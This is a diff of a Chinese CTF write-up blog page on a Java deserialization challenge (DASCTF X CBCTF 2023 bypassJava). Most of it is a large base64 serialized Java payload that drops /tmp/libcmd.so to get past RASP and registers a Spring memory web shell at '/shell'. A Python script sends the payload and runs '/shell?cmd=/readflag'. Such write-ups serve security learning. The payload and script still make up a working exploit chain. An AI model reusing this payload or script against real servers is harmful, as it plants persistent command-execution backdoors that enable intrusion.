FBQUFBQUFBQUFBQUFBQUJBQUFCQUJZQUFCQWdBQUFBQUFBQUFBQUFBQUFBQUJZQkFBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRElCQUFBUUFCWUFZQkFnQUFBQUFBQUFBQUFBQUFBQUFEa0JBQUFTQUF3QUFBb0FBQUFBQUFBQUFBQUFBQUFBQUQ4QkFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRk1CQUFBU0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFHY0JBQUFTQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUhvQkFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBSXdCQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFKc0JBQUFTQUFzQVpRZ0FBQUFBQUFDY0FBQUFBQUFBQUtJQkFBQVNBQXNBQVFrQUFBQUFBQUQ4QUFBQUFBQUFBTGtCQUFBUUFCY0FhQkFnQUFBQUFBQUFBQUFBQUFBQUFMNEJBQUFRQUJjQVlCQWdBQUFBQUFBQUFBQUFBQUFBQU1vQkFBQVNBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBTjBCQUFBZ0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFQRUJBQUFTQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFVQ0FBQWdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQjhDQUFBaUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFEc0NBQUFTQUFrQXdBWUFBQUFBQUFBQUFBQUFBQUFBQUFCamNuUnpkSFZtWmk1akFGOWZTa05TWDB4SlUxUmZYd0JrWlhKbFoybHpkR1Z5WDNSdFgyTnNiMjVsY3dCZlgyUnZYMmRzYjJKaGJGOWtkRzl5YzE5aGRYZ0FZMjl0Y0d4bGRHVmtMall6TlRVQVgxOWtiMTluYkc5aVlXeGZaSFJ2Y25OZllYVjRYMlpwYm1sZllYSnlZWGxmWlc1MGNua0FabkpoYldWZlpIVnRiWGtBWDE5bWNtRnRaVjlrZFcxdGVWOXBibWwwWDJGeWNtRjVYMlZ1ZEhKNUFFVjJhV3hEYkdGemN5NWpBRjlmUmxKQlRVVmZSVTVFWDE4QVgxOUtRMUpmUlU1RVgxOEFYMTlrYzI5ZmFHRnVaR3hsQUY5RVdVNUJUVWxEQUY5ZlIwNVZYMFZJWDBaU1FVMUZYMGhFVWdCZlgxUk5RMTlGVGtSZlh3QmZSMHhQUWtGTVgwOUdSbE5GVkY5VVFVSk1SVjhBWDBsVVRWOWtaWEpsWjJsemRHVnlWRTFEYkc5dVpWUmhZbXhsQUY5bFpHRjBZUUJmWm1sdWFRQndZMnh2YzJWQVFFZE1TVUpEWHpJdU1pNDFBRzFsYlhObGRFQkFSMHhKUWtOZk1pNHlMalVBWm1kbGRITkFRRWRNU1VKRFh6SXVNaTQxQUdabGIyWkFRRWRNU1VKRFh6SXVNaTQxQUY5ZloyMXZibDl6ZEdGeWRGOWZBR1Y0WldOdFpBQktZWFpoWDBWMmFXeERiR0Z6YzE5bGVHVmpRMjFrQUY5bGJtUUFYMTlpYzNOZmMzUmhjblFBY0c5d1pXNUFRRWRNU1VKRFh6SXVNaTQxQUY5S2RsOVNaV2RwYzNSbGNrTnNZWE56WlhNQWMzUnlZMkYwUUVCSFRFbENRMTh5TGpJdU5RQmZTVlJOWDNKbFoybHpkR1Z5VkUxRGJHOXVaVlJoWW14bEFGOWZZM2hoWDJacGJtRnNhWHBsUUVCSFRFbENRMTh5TGpJdU5RQmZhVzVwZEFBQUxuTjViWFJoWWdBdWMzUnlkR0ZpQUM1emFITjBjblJoWWdBdWJtOTBaUzVuYm5VdVluVnBiR1F0YVdRQUxtZHVkUzVvWVhOb0FDNWtlVzV6ZVcwQUxtUjVibk4wY2dBdVoyNTFMblpsY25OcGIyNEFMbWR1ZFM1MlpYSnphVzl1WDNJQUxuSmxiR0V1WkhsdUFDNXlaV3hoTG5Cc2RBQXVhVzVwZEFBdWRHVjRkQUF1Wm1sdWFRQXVjbTlrWVhSaEFDNWxhRjltY21GdFpWOW9aSElBTG1Wb1gyWnlZVzFsQUM1cGJtbDBYMkZ5Y21GNUFDNW1hVzVwWDJGeWNtRjVBQzVxWTNJQUxtUmhkR0V1Y21Wc0xuSnZBQzVrZVc1aGJXbGpBQzVuYjNRQUxtZHZkQzV3YkhRQUxtSnpjd0F1WTI5dGJXVnVkQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFHd0FBQUFjQUFBQUNBQUFBQUFBQUFNZ0JBQUFBQUFBQXlBRUFBQUFBQUFBa0FBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQzRBQUFEMi8vOXZBZ0FBQUFBQUFBRHdBUUFBQUFBQUFQQUJBQUFBQUFBQVFBQUFBQUFBQUFBREFBQUFBQUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUE0QUFBQUN3QUFBQUlBQUFBQUFBQUFNQUlBQUFBQUFBQXdBZ0FBQUFBQUFNZ0JBQUFBQUFBQUJBQUFBQUVBQUFBSUFBQUFBQUFBQUJnQUFBQUFBQUFBUUFBQUFBTUFBQUFDQUFBQUFBQUFBUGdEQUFBQUFBQUErQU1BQUFBQUFBRG5BQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUVnQUFBRC8vLzl2QWdBQUFBQUFBQURnQkFBQUFBQUFBT0FFQUFBQUFBQUFKZ0FBQUFBQUFBQURBQUFBQUFBQUFBSUFBQUFBQUFBQUFnQUFBQUFBQUFCVkFBQUEvdi8vYndJQUFBQUFBQUFBQ0FVQUFBQUFBQUFJQlFBQUFBQUFBQ0FBQUFBQUFBQUFCQUFBQUFFQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQVpBQUFBQVFBQUFBQ0FBQUFBQUFBQUNnRkFBQUFBQUFBS0FVQUFBQUFBQURBQUFBQUFBQUFBQU1BQUFBQUFBQUFDQUFBQUFBQUFBQVlBQUFBQUFBQUFHNEFBQUFFQUFBQVFnQUFBQUFBQUFEb0JRQUFBQUFBQU9nRkFBQUFBQUFBMkFBQUFBQUFBQUFEQUFBQUZnQUFBQWdBQUFBQUFBQUFHQUFBQUFBQUFBQjRBQUFBQVFBQUFBWUFBQUFBQUFBQXdBWUFBQUFBQUFEQUJnQUFBQUFBQUJvQUFBQUFBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFjd0FBQUFFQUFBQUdBQUFBQUFBQUFPQUdBQUFBQUFBQTRBWUFBQUFBQUFDZ0FBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFRQUFBQUFBQUFBSDRBQUFBQkFBQUFCZ0FBQUFBQUFBQ0FCd0FBQUFBQUFJQUhBQUFBQUFBQWZRSUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUNFQUFBQUFRQUFBQVlBQUFBQUFBQUFBQW9BQUFBQUFBQUFDZ0FBQUFBQUFBa0FBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFBaWdBQUFBRUFBQUFDQUFBQUFBQUFBQWtLQUFBQUFBQUFDUW9BQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUpJQUFBQUJBQUFBQWdBQUFBQUFBQUFNQ2dBQUFBQUFBQXdLQUFBQUFBQUFKQUFBQUFBQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQUFBQUFBQUFBQUFDZ0FBQUFBUUFBQUFJQUFBQUFBQUFBTUFvQUFBQUFBQUF3Q2dBQUFBQUFBSVFBQUFBQUFBQUFBQUFBQUFBQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQXFnQUFBQTRBQUFBREFBQUFBQUFBQVBnTklBQUFBQUFBK0EwQUFBQUFBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFBQUFBQUlBQUFBQUFBQUFMWUFBQUFQQUFBQUF3QUFBQUFBQUFBQURpQUFBQUFBQUFBT0FBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQWdBQUFBQUFBQUFDQUFBQUFBQUFBRENBQUFBQVFBQUFBTUFBQUFBQUFBQUNBNGdBQUFBQUFBSURnQUFBQUFBQUFnQUFBQUFBQUFBQUFBQUFBQUFBQUFJQUFBQUFBQUFBQUFBQUFBQUFBQUF4d0FBQUFFQUFBQURBQUFBQUFBQUFCQU9JQUFBQUFBQUVBNEFBQUFBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBTlFBQUFBR0FBQUFBd0FBQUFBQUFBQVlEaUFBQUFBQUFCZ09BQUFBQUFBQXdBRUFBQUFBQUFBRUFBQUFBQUFBQUFnQUFBQUFBQUFBRUFBQUFBQUFBQURkQUFBQUFRQUFBQU1BQUFBQUFBQUEyQThnQUFBQUFBRFlEd0FBQUFBQUFDZ0FBQUFBQUFBQUFBQUFBQUFBQUFBSUFBQUFBQUFBQUFnQUFBQUFBQUFBNGdBQUFBRUFBQUFEQUFBQUFBQUFBQUFRSUFBQUFBQUFBQkFBQUFBQUFBQmdBQUFBQUFBQUFBQUFBQUFBQUFBQUNBQUFBQUFBQUFBSUFBQUFBQUFBQU9zQUFBQUlBQUFBQXdBQUFBQUFBQUJnRUNBQUFBQUFBR0FRQUFBQUFBQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFBQUFBQUFBQUFEd0FBQUFBUUFBQURBQUFBQUFBQUFBQUFBQUFBQUFBQUJnRUFBQUFBQUFBQzBBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBRUFBQUFBQUFBQUFRQUFBQUlBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBa0JBQUFBQUFBQURRQlFBQUFBQUFBQm9BQUFBc0FBQUFDQUFBQUFBQUFBQVlBQUFBQUFBQUFBa0FBQUFEQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUdBV0FBQUFBQUFBUVFJQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBQVJBQUFBQXdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDaEdBQUFBQUFBQVBrQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUEHAN0MAN4A3wEAGGphdmEvaW8vUmFuZG9tQWNjZXNzRmlsZQEADi90bXAvbGliY21kLnNvAQACcncMAEMA4AwA1gDhDADiAEQMAOMA5AEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgwA5QDmAQAjamF2YS5sYW5nLkNsYXNzTG9hZGVyJE5hdGl2ZUxpYnJhcnkBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwDnDADoAGwMAOkA6gcA6wwA7ADtAQAPbmF0aXZlTGlicmFyaWVzDADuAO8HAPAMAPEA8gEAEGphdmEvdXRpbC9WZWN0b3IMAPMA9AcA9QEAEGphdmEvbGFuZy9PYmplY3QMAPYA9wwA+AD5DAD6APsMAPwA/QwA/gD/BwEADAEBAQIBADlvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5zZXJ2bGV0LkRpc3BhdGNoZXJTZXJ2bGV0LkNPTlRFWFQHAQMMAQQBBQEANW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0AQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwwBBgEHDAEIAQkHAQoBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAELAOoBAAYvc2hlbGwMAQwBDgcBDwwBEAERDAESARMMARQBFQEAE2phdmEvbGFuZy9FeGNlcHRpb24MARYARAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAHRGVjb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBAAZkZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFKFtCKVYBAAVjbG9zZQEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0Jvb2xlYW4BAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAB3ZhbHVlT2YBABYoWilMamF2YS9sYW5nL0Jvb2xlYW47AQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAphZGRFbGVtZW50AQAVKExqYXZhL2xhbmcvT2JqZWN0OylWAQADc2V0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEACWdldE1ldGhvZAEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAPcmVnaXN0ZXJNYXBwaW5nAQBuKExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7KVYBAA9wcmludFN0YWNrVHJhY2UAIQAJAD4AAAACABoAPwBAAAEAQQAAAAIACgAaAEIAQAABAEEAAAACAA0ABgABAEMARAABAEUAAAAvAAEAAQAAAAUqtwABsQAAAAIARgAAAAYAAQAAABQARwAAAAwAAQAAAAUASABJAAABCQBKAEsAAAABAEwATQACAEUAAACcAAIABQAAACgrEgK5AAMCAE4txgAdLbgABDoELLkABQEAGQS2AAYsuQAFAQC2AAexAAAAAwBGAAAAGgAGAAAARwAJAEgADQBJABMASgAeAEsAJwBNAEcAAAA0AAUAEwAUAE4AQAAEAAAAKABIAEkAAAAAACgATwBQAAEAAAAoAFEAUgACAAkAHwBTAEAAAwBUAAAACAAB/AAnBwBVAFYAAAAEAAEAVwABAFgAWQACAEUAAAA/AAAAAwAAAAGxAAAAAgBGAAAABgABAAAAUgBHAAAAIAADAAAAAQBIAEkAAAAAAAEAWgBbAAEAAAABAFwAXQACAFYAAAAEAAEAXgABAFgAXwACAEUAAABJAAAABAAAAAGxAAAAAgBGAAAABgABAAAAVwBHAAAAKgAEAAAAAQBIAEkAAAAAAAEAWgBbAAEAAAABAGAAYQACAAAAAQBiAGMAAwBWAAAABAABAF4ACABkAEQAAQBFAAAC9QAGABEAAAFWuAAIEgq2AAtLuwAMWRINEg63AA9MKyq2ABArtgAREgm2ABJNEhO4ABROEhW4ABQ6BBkEEhYFvQAXWQMSGFNZBLIAGVO2ABo6BRkFBLYAGy0SHLYAHToGGQYEtgAeGQYstgAfwAAgOgcZBAa9ABdZAxIXU1kEEhhTWQWyABlTtgAhOggZCAS2ACIZCAa9ACNZAxIJU1kEEg1TWQUDuAAkU7YAJToJGQcZCbYAJhkGLBkHtgAnGQUZCQW9ACNZAxINU1kEA7gAJFO2AChXuAApEioDuQArAwDAACw6ChkKEi25AC4CAMAALToLGQu2AC8SMLYAHToMGQwEtgAeGQwZC7YAH8AAMToNEgkSMgW9ABdZAxIzU1kEEjRTtgA1Og4EvQAYWQMSNlO4ADcZDbkAOAIAuQA5AQA6D7sACVm3ADo6EBkLGQ8ZEBkOtgA7pwAISyq2AD2xAAEAAAFNAVAAPAAEAEYAAACKACIAAAAdAAkAHgAVAB8AGgAgAB4AIwAkACQAKgAlADEAJgBJACcATwAoAFcAKQBdACoAaAArAIMALACJAC0ApQAuAKwALwC0ADAAzAAzANwANADqADUA9gA2APwANwEAADgBCAA5AR8AOgEtADsBMgA8ATkAPQFCAD4BTQBCAVAAQAFRAEEBVQBDAEcAAAC2ABIACQFEAGUAZgAAABUBOABnAGgAAQAkASkAaQBqAAIAKgEjAGsAbAADADEBHABtAGwABABJAQQAbgBvAAUAVwD2AHAAcQAGAGgA5QByAHMABwCDAMoAdAB1AAgApQCoAHYAdwAJANwAcQB4AHkACgDqAGMAegB7AAsA9gBXAHwAcQAMAQgARQB9AIAADQEfAC4AgQBvAA4BOQAUAIIAgwAPAUIACwCEAEkAEAFRAAQAhQCGAAAAhwAAACoABAAqASMAawCIAAMAMQEcAG0AiAAEAGgA5QByAIkABwCDAMoAdACKAAgAVAAAAAkAAvcBUAcAiwQAAgCMAAAAAgCNAH8AAAAaAAMAMQDCAH4ACQCZAJUA2wAJAMkAwgENBglwdAAEdGVzdHB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAADdnIAI29yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLlNwcmluZ1Byb3h5AAAAAAAAAAAAAAB4cHZyAClvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5mcmFtZXdvcmsuQWR2aXNlZAAAAAAAAAAAAAAAeHB2cgAob3JnLnNwcmluZ2ZyYW1ld29yay5jb3JlLkRlY29yYXRpbmdQcm94eQAAAAAAAAAAAAAAeHA=&quot;&quot;&quot;</span>
+payload = <span class="hljs-string">&quot;&quot;&quot;........&quot;&quot;&quot;</span>
 
 hex_string = <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload))[<span class="hljs-number">2</span>:]
 hex_string = <span class="hljs-built_in">str</span>(hex_string)
-burp0_data = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hex_string&#125;</span>\r\n<span class="hljs-subst">&#123;payload&#125;</span>\r\n0\r\n\r\n&quot;</span>
+burp0_data = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hex_string&#125;</span>\r\n<span class="hljs-subst">&#123;payload&#125;</span>\r\n0\r\n\r\n&quot;</span>   <span class="hljs-comment">#chunked编码格式</span>
 res = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
 <span class="hljs-built_in">print</span>(res.text)
 res = requests.get(baseUrl + <span class="hljs-string">&quot;/shell?cmd=/readflag&quot;</span>)
 <span class="hljs-built_in">print</span>(res.text)</code></pre></div>
+
+<p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231127213739145.png" srcset="/img/loading.gif" lazyload alt="image-20231127213739145"></p>
+<p>见证历史性的一刻，嘻嘻，真的看了好久了（快十几天了，断断续续的），终于成功了</p>
+<p><a target="_blank" rel="noopener" href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/#POC">DASCTFXCBCTF_2023_bypassJava_Wp (pankas.top)</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/11/05/DASCTF%20X%20CBCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0%20Writeup/">强大的Boogipop大佬WP</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>唉，nomap还是没做出来，重写方法太难了</p>
+<p>值得一提的是这篇文章的题都是用jackson打的，在写着一篇时终于会利用Jackson了，并且完善了jackson那篇文章</p>
+<p>rasp也是多学到了一个知识点</p>
+<p>但是也不是什么都懂了，有关代码具体部分要我写我肯定是写不出来的，只能算多学一个知识点</p>
+<p>这样不行啊，还是得向Boogipop大佬学习尽快学完javaweb、javamvc、servlet等等，不然内存马也学不了一点</p>
 
                 
               </div>
@@ -1467,6 +1748,12 @@ res = requests.get(baseUrl + <span class="hljs-string">&quot;/shell?cmd=/readfla
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/11/20/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/" title="vm沙箱逃逸初识">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vm沙箱逃逸初识</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
@@ -1585,26 +1872,9 @@ res = requests.get(baseUrl + <span class="hljs-string">&quot;/shell?cmd=/readfla
     <div class="beian">
   <span>
     <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
-      京ICP证123456号
+      
     </a>
   </span>
-  
-    
-      <span>
-        <a
-          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
-          rel="nofollow noopener"
-          class="beian-police"
-          target="_blank"
-        >
-          
-            <span style="visibility: hidden; width: 0">|</span>
-            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
-          
-          <span>京公网安备12345678号</span>
-        </a>
-      </span>
-    
   
 </div>
 
